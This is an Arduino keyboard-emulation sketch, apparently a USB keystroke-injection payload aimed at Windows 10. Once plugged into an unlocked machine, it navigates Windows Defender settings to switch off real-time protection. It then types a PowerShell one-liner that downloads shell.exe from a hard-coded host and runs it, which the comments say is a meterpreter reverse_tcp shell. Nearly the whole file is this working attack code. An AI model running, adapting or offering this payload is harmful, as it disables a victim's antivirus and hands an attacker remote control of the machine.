#include <Keyboard.h>'

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{

  Keyboard.begin();

  // Start Payload
  // Title: msfQuack.txt

  // Author: mikeOxmaul (Props: Dan Tentler <Twitter @Viss> and Matt Graeber <Twitter @mattifestation>)

  // Date: 20020308

  // Target: Windows 10 (v. 1809)

  // Assumptions:

  // 1. Used against unlocked device w/admin lvl privileges

  // 2. Default 'prompt for consent' UAC policy in place for admin accts

  // Script will do the following:

  // 1. Remove Security Definitions for Windows Defender & Disable IOffice AV Protection

  // 2. Disable Real Time Monitoring Protection & Add Exclusion Path

  // 3. Download, Save and Run payload (windows/meterpreter/reverse_tcp)

  // Apologies in advance for the funky delays and not using 'GUI r'.  Tested on VirtualBox 6.1 on a macOS host.

   // Start Payload
  delay(3000);

  // Open Windows Defender settings

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("Windows Defender Settings");

  delay(100);

  typeKey(KEY_RETURN);

  // Navigate to realtime protection and disable it

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(' ');

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(500);

  // Close Settings

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(3000);

  // 3 second delay for device to register

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1700);
  Keyboard.print("powershell");  
  typeKey(KEY_RETURN);
  delay(200);
  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://192.168.0.229:8080/shell.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  delay(150);
  typeKey(KEY_RETURN);
  Keyboard.end();
}

// Unused
void loop() {}
